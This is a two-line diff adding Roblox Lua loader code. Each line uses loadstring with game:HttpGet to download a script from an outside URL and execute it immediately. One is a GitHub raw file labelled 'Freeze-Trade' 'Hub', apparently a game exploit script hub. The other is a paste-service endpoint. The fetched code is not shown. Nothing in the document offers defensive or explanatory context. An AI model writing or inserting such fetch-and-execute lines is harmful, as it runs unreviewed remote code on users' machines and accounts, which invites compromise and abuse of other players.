@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkSpawnerGarden/Freeze-Trade/refs/heads/main/Hub"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/GBvbQBXvHNczJ5DR/raw", true))()
